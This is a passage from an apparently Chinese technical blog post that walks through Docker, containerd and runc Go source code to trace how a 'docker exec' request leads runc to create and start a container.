    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Args</span> <span class="p">=</span> <span class="nx">args</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Tty</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">Tty</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Privileged</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">Privileged</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">User</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">User</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">WorkingDir</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">WorkingDir</span>

    <span class="o">...</span>

    <span class="k">return</span> <span class="nx">execConfig</span><span class="p">.</span><span class="nx">ID</span><span class="p">,</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>再结合之前的<a href="#runExec" rel="">runExec函数</a>，该函数创建容器之后，根据是否attach会最终执行<code>components/cli/vendor/github.com/docker/docker/client/container_exec.go</code>中的下面两个函数之一，这两个函数都是发送<code>&quot;/exec/&quot;+execID+&quot;/start&quot;</code>请求，因此<code>r.postContainerExecStart()</code>会被执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// ContainerExecStart starts an exec process already created in the docker host.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">cli</span> <span class="o">*</span><span class="nx">Client</span><span class="p">)</span> <span class="nf">ContainerExecStart</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">execID</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">config</span> <span class="nx">types</span><span class="p">.</span><span class="nx">ExecStartCheck</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="nx">resp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cli</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;/exec/&#34;</span><span class="o">+</span><span class="nx">execID</span><span class="o">+</span><span class="s">&#34;/start&#34;</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">config</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="nf">ensureReaderClosed</span><span class="p">(</span><span class="nx">resp</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">err</span>
<span class="p">}</span>

<span class="c1">// ContainerExecAttach attaches a connection to an exec process in the server.
</span><span class="c1">// It returns a types.HijackedConnection with the hijacked connection
</span><span class="c1">// and the a reader to get output. It&#39;s up to the called to close
</span><span class="c1">// the hijacked connection by calling types.HijackedResponse.Close.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">cli</span> <span class="o">*</span><span class="nx">Client</span><span class="p">)</span> <span class="nf">ContainerExecAttach</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">execID</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">config</span> <span class="nx">types</span><span class="p">.</span><span class="nx">ExecStartCheck</span><span class="p">)</span> <span class="p">(</span><span class="nx">types</span><span class="p">.</span><span class="nx">HijackedResponse</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">headers</span> <span class="o">:=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">][]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s">&#34;application/json&#34;</span><span class="p">}}</span>
    <span class="k">return</span> <span class="nx">cli</span><span class="p">.</span><span class="nf">postHijacked</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;/exec/&#34;</span><span class="o">+</span><span class="nx">execID</span><span class="o">+</span><span class="s">&#34;/start&#34;</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">config</span><span class="p">,</span> <span class="nx">headers</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// TODO(vishh): Refactor the code to avoid having to specify stream config as part of both create and start.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">containerRouter</span><span class="p">)</span> <span class="nf">postContainerExecStart</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">,</span> <span class="nx">vars</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="o">...</span>

    <span class="c1">// Now run the user process in container.
</span><span class="c1"></span>    <span class="c1">// Maybe we should we pass ctx here if we&#39;re not detaching?
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">backend</span><span class="p">.</span><span class="nf">ContainerExecStart</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">execName</span><span class="p">,</span> <span class="nx">stdin</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">execStartCheck</span><span class="p">.</span><span class="nx">Detach</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
        <span class="nx">stdout</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;\r\n&#34;</span><span class="p">))</span>
        <span class="nx">logrus</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;Error running exec %s in container: %v&#34;</span><span class="p">,</span> <span class="nx">execName</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>postContainerExecStart()</code>再调用<code>ContainerExecStart()</code>(<code>components/engine/daemon/exec.go#153</code>)去启动容器。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// ContainerExecStart starts a previously set up exec instance. The
</span><span class="c1">// std streams are set up.
</span><span class="c1">// If ctx is cancelled, the process is terminated.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">daemon</span> <span class="o">*</span><span class="nx">Daemon</span><span class="p">)</span> <span class="nf">ContainerExecStart</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">name</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">stdin</span> <span class="nx">io</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span> <span class="nx">stdout</span> <span class="nx">io</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span> <span class="nx">stderr</span> <span class="nx">io</span><span class="p">.</span><span class="nx">Writer</span><span class="p">)</span> <span class="p">(</span><span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>
    <span class="c1">//通过containerd执行命令
</span><span class="c1"></span>    <span class="nx">systemPid</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">daemon</span><span class="p">.</span><span class="nx">containerd</span><span class="p">.</span><span class="nf">Exec</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">ID</span><span class="p">,</span> <span class="nx">ec</span><span class="p">.</span><span class="nx">ID</span><span class="p">,</span> <span class="nx">p</span><span class="p">,</span> <span class="nx">cStdin</span> <span class="o">!=</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">ec</span><span class="p">.</span><span class="nx">InitializeStdio</span><span class="p">)</span>
    <span class="o">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>containerd再继续通过containerd-shim调用runc，最终执行runc run</p>
<h2 id="0x01-容器之外的runc进程启动">0x01 容器之外的runc进程启动</h2>
<p>main函数中创建了新的app对象(<code>main.go#54</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">app</span> <span class="o">:=</span> <span class="nx">cli</span><span class="p">.</span><span class="nf">NewApp</span><span class="p">()</span>
    <span class="nx">app</span><span class="p">.</span><span class="nx">Name</span> <span class="p">=</span> <span class="s">&#34;runc&#34;</span>
    <span class="nx">app</span><span class="p">.</span><span class="nx">Usage</span> <span class="p">=</span> <span class="nx">usage</span>
    <span class="o">...</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">app</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nf">fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>app.Run()</code>会调用<code>run.go</code>中定义的Action(<code>run.go#65</code>)，进而调用<code>startContainer()</code>函数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="nx">Action</span><span class="p">:</span> <span class="kd">func</span><span class="p">(</span><span class="nx">context</span> <span class="o">*</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">checkArgs</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">exactArgs</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">revisePidFile</span><span class="p">(</span><span class="nx">context</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="nx">spec</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">setupSpec</span><span class="p">(</span><span class="nx">context</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="nx">status</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">startContainer</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">spec</span><span class="p">,</span> <span class="nx">CT_ACT_RUN</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="c1">// exit with the container&#39;s exit status so any external supervisor is
</span><span class="c1"></span>        <span class="c1">// notified of the exit with the correct exit status.
</span><span class="c1"></span>        <span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">err</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><p>startContainer()函数(<code>utils_linux.go#265</code>)创建容器信息，并启动容器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">startContainer</span><span class="p">(</span><span class="nx">context</span> <span class="o">*</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">spec</span> <span class="o">*</span><span class="nx">specs</span><span class="p">.</span><span class="nx">Spec</span><span class="p">,</span> <span class="nx">action</span> <span class="nx">CtAct</span><span class="p">,</span> <span class="nx">criuOpts</span> <span class="o">*</span><span class="nx">libcontainer</span><span class="p">.</span><span class="nx">CriuOpts</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>
    <span class="c1">//创建容器信息
</span><span class="c1"></span>    <span class="nx">container</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">createContainer</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">spec</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="o">...</span>
    <span class="c1">//创建r变量，调用r.run()启动容器
</span><span class="c1"></span>    <span class="nx">r</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">runner</span><span class="p">{</span>
        <span class="nx">enableSubreaper</span><span class="p">:</span> <span class="p">!</span><span class="nx">context</span><span class="p">.</span><span class="nf">Bool</span><span class="p">(</span><span class="s">&#34;no-subreaper&#34;</span><span class="p">),</span>
        <span class="nx">shouldDestroy</span><span class="p">:</span>   <span class="kc">true</span><span class="p">,</span>
        <span class="nx">container</span><span class="p">:</span>       <span class="nx">container</span><span class="p">,</span>
        <span class="nx">listenFDs</span><span class="p">:</span>       <span class="nx">listenFDs</span><span class="p">,</span>
        <span class="nx">notifySocket</span><span class="p">:</span>    <span class="nx">notifySocket</span><span class="p">,</span>
        <span class="nx">consoleSocket</span><span class="p">:</span>   <span class="nx">context</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;console-socket&#34;</span><span class="p">),</span>
        <span class="nx">detach</span><span class="p">:</span>          <span class="nx">context</span><span class="p">.</span><span class="nf">Bool</span><span class="p">(</span><span class="s">&#34;detach&#34;</span><span class="p">),</span>
        <span class="nx">pidFile</span><span class="p">:</span>         <span class="nx">context</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;pid-file&#34;</span><span class="p">),</span>
        <span class="nx">preserveFDs</span><span class="p">:</span>     <span class="nx">context</span><span class="p">.</span><span class="nf">Int</span><span class="p">(</span><span class="s">&#34;preserve-fds&#34;</span><span class="p">),</span>
        <span class="nx">action</span><span class="p">:</span>          <span class="nx">action</span><span class="p">,</span>
        <span class="nx">criuOpts</span><span class="p">:</span>        <span class="nx">criuOpts</span><span class="p">,</span>
        <span class="nx">init</span><span class="p">:</span>            <span class="kc">true</span><span class="p">,</span>
        <span class="nx">logLevel</span><span class="p">:</span>        <span class="nx">logLevel</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">r</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">spec</span><span class="p">.</span><span class="nx">Process</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>先来看<code>createContainer()</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">createContainer</span><span class="p">(</span><span class="nx">context</span> <span class="o">*</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">id</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">spec</span> <span class="o">*</span><span class="nx">specs</span><span class="p">.</span><span class="nx">Spec</span><span class="p">)</span> <span class="p">(</span><span class="nx">libcontainer</span><span class="p">.</span><span class="nx">Container</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">rootlessCg</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">shouldUseRootlessCgroupManager</span><span class="p">(</span><span class="nx">context</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="nx">config</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">specconv</span><span class="p">.</span><span class="nf">CreateLibcontainerConfig</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">specconv</span><span class="p">.</span><span class="nx">CreateOpts</span><span class="p">{</span>
        <span class="nx">CgroupName</span><span class="p">:</span>       <span class="nx">id</span><span class="p">,</span>
        <span class="nx">UseSystemdCgroup</span><span class="p">:</span> <span class="nx">context</span><span class="p">.</span><span class="nf">GlobalBool</span><span class="p">(</span><span class="s">&#34;systemd-cgroup&#34;</span><span class="p">),</span>
        <span class="nx">NoPivotRoot</span><span class="p">:</span>      <span class="nx">context</span><span class="p">.</span><span class="nf">Bool</span><span class="p">(</span><span class="s">&#34;no-pivot&#34;</span><span class="p">),</span>
        <span class="nx">NoNewKeyring</span><span class="p">:</span>     <span class="nx">context</span><span class="p">.</span><span class="nf">Bool</span><span class="p">(</span><span class="s">&#34;no-new-keyring&#34;</span><span class="p">),</span>
        <span class="nx">Spec</span><span class="p">:</span>             <span class="nx">spec</span><span class="p">,</span>
        <span class="nx">RootlessEUID</span><span class="p">:</span>     <span class="nx">os</span><span class="p">.</span><span class="nf">Geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="nx">RootlessCgroups</span><span class="p">:</span>  <span class="nx">rootlessCg</span><span class="p">,</span>
    <span class="p">})</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="nx">factory</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">loadFactory</span><span class="p">(</span><span class="nx">context</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">factory</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">config</span><span class="p">)</span>
<span class="p">}</span>

<span class="c1">// loadFactory returns the configured factory instance for execing containers.
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">loadFactory</span><span class="p">(</span><span class="nx">context</span> <span class="o">*</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">(</span><span class="nx">libcontainer</span><span class="p">.</span><span class="nx">Factory</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>

    <span class="k">return</span> <span class="nx">libcontainer</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="nx">abs</span><span class="p">,</span> <span class="nx">cgroupManager</span><span class="p">,</span> <span class="nx">intelRdtManager</span><span class="p">,</span>
        <span class="nx">libcontainer</span><span class="p">.</span><span class="nf">CriuPath</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">GlobalString</span><span class="p">(</span><span class="s">&#34;criu&#34;</span><span class="p">)),</span>
        <span class="nx">libcontainer</span><span class="p">.</span><span class="nf">NewuidmapPath</span><span class="p">(</span><span class="nx">newuidmap</span><span class="p">),</span>
        <span class="nx">libcontainer</span><span class="p">.</span><span class="nf">NewgidmapPath</span><span class="p">(</span><span class="nx">newgidmap</span><span class="p">))</span>
<span class="p">}</span>

<span class="c1">// New returns a linux based container factory based in the root directory and
</span><span class="c1">// configures the factory with the provided option funcs.
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">New</span><span class="p">(</span><span class="nx">root</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">options</span> <span class="o">...</span><span class="kd">func</span><span class="p">(</span><span class="o">*</span><span class="nx">LinuxFactory</span><span class="p">)</span> <span class="kt">error</span><span class="p">)</span> <span class="p">(</span><span class="nx">Factory</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="nx">root</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">MkdirAll</span><span class="p">(</span><span class="nx">root</span><span class="p">,</span> <span class="mi">0</span><span class="nx">o700</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nf">newGenericError</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">SystemError</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">l</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">LinuxFactory</span><span class="p">{</span>
        <span class="nx">Root</span><span class="p">:</span>      <span class="nx">root</span><span class="p">,</span>
        <span class="nx">InitPath</span><span class="p">:</span>  <span class="s">&#34;/proc/self/exe&#34;</span><span class="p">,</span>
        <span class="c1">// 这里的结果就 InitArgs: &#34;runc init&#34;
</span><span class="c1"></span>        <span class="nx">InitArgs</span><span class="p">:</span>  <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">&#34;init&#34;</span><span class="p">},</span>
        <span class="nx">Validator</span><span class="p">:</span> <span class="nx">validate</span><span class="p">.</span><span class="nf">New</span><span class="p">(),</span>
        <span class="nx">CriuPath</span><span class="p">:</span>  <span class="s">&#34;criu&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="nf">Cgroupfs</span><span class="p">(</span><span class="nx">l</span><span class="p">)</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">opt</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">options</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">opt</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">continue</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">opt</span><span class="p">(</span><span class="nx">l</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">l</span><span class="p">,</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>createContainer()</code>函数的执行逻辑为：</p>
<ul>
<li>调用<code>loadFactory()</code>函数，获取<code>LinuxFactory</code>类型对象</li>
<li>调用该类型的Create函数</li>
</ul>
<p>所以来分析<code>LinuxFactory</code>类型的<code>Create()</code>函数，可以看到其创建了<code>linuxContainer</code>类型对象并将其返回。所以<code>startContainer()</code>函数中的<code>container</code>变量类型为<code>linuxContainer</code>（这与后续的<code>r.run()</code>函数有关）。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
